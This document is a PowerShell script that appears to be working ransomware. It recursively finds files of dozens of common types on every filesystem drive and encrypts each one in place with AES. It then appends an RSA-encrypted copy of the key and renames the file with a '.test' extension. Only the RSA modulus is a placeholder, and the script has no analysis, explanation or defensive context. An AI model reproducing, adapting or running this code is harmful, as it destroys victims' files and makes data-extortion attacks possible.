# RSA Public Key
$sf = @"
<RSAKeyValue>
<Modulus>YOUR_PUBLIC_MODULUS_HERE</Modulus>
<Exponent>AQAB</Exponent>
</RSAKeyValue>
"@
function GER($n) {
 -join (1..$n | % { "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:',.<>?`~"[(Get-Random -Maximum 74)] })
}
function err($pl,$sf) {
 $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
 $rsa.FromXmlString($sf)
 $PB = [Text.Encoding]::UTF8.GetBytes($pl)
 $rsa.Encrypt($PB,$false)
}
function EFI($ifi,$key,$iv,$aT) {
 if ($ifi.EndsWith(".test",[StringComparison]::OrdinalIgnoreCase)) { return }
 $aes = [System.Security.Cryptography.Aes]::Create()
 $aes.KeySize = 256
 $aes.Key = $key
 $aes.IV = $iv
 try {
   $yy = New-Object IO.FileStream($ifi,[IO.FileMode]::Open,[IO.FileAccess]::ReadWrite,[IO.FileShare]::None)
   $xx = $aes.CreateEncryptor()
   $mm = New-Object Security.Cryptography.CryptoStream($yy,$xx,[Security.Cryptography.CryptoStreamMode]::Write)
   $yy.Seek(0,[IO.SeekOrigin]::Begin) | Out-Null
   $jj = New-Object byte[] ($yy.Length)
   $yy.Read($jj,0,$jj.Length) | Out-Null
   $yy.Seek(0,[IO.SeekOrigin]::Begin) | Out-Null
   $mm.Write($jj,0,$jj.Length)
   $mm.FlushFinalBlock()
   $se = 1
 } catch {
   Write-Error $_
 } finally {
   if ($mm) { $mm.Dispose() }
   if ($yy) { $yy.Dispose() }
 }
 try {
   $kk = [Text.Encoding]::UTF8.GetBytes($aT)
   $bb = New-Object IO.FileStream($ifi,[IO.FileMode]::Append,[IO.FileAccess]::Write,[IO.FileShare]::None)
   if ($se) { $bb.Write($kk,0,$kk.Length) }
 } catch {
   Write-Error $_
 } finally {
   if ($bb) {
     $bb.Dispose()
     if ($se) { ren $ifi -NewName $ifi".test" }
   }
 }
}
function gg($path) {
 $ke = GER(32)
 $ig = GER(16)
 $eec = err -pl ($ke + $ig) -sf $sf
 $eee = [Convert]::ToBase64String($eec)
 $key = [Text.Encoding]::UTF8.GetBytes($ke)
 $iv = [Text.Encoding]::UTF8.GetBytes($ig)
 try {
   $files = gci $path -Recurse -Include *.pdf,*.txt,*.doc,*.docx,*.odt,*.rtf,*.md,*.csv,*.tsv,*.jpg,*.jpeg,*.tiff,*.mp3,*.xls,*.xlsx,*.ods,*.ppt,*.pptx,*.odp,*.py,*.java,*.cpp,*.c,*.html,*.css,*.js,*.php,*.swift,*.kotlin,*.go,*.rb,*.sh,*.sql,*.db,*.sqlite,*.sqlite3,*.mdb,*.zip,*.rar,*.7z,*.tar,*.gz,*.bz2,*.iso,*.torrent,*.ini,*.json,*.xml,*.log,*.bak,*.cfg,*.psd,*.vmdk | select -Expand FullName
   foreach ($file in $files) {
     try { EFI $file $key $iv $eee } catch {}
   }
 } catch {
   Write-Host $_
 }
}
$vg = gdr -PS FileSystem | select -Expand Root
foreach ($II in $vg) { gg -path "$II" }